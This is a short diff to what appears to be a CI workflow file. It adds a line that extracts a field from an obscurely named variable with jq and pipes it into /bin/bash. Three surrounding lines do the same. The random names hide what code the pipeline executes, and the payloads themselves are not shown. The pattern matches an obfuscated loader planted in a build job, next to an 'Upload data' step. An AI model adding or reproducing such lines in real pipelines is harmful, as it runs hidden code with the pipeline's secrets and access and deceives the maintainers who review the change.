@@ -29,6 +29,7 @@ jobs:
           echo $furf26428 | jq -r .hgyd7 | /bin/bash
           echo $nq025 | jq -r .mo47149 | /bin/bash
           printf '%s' "$hynsk0048" | jq -r .yx286 | /bin/bash
+          printf '%s' "$mwm73" | jq -r .drxt76 | /bin/bash
 
       - name: Upload data
         if: always()
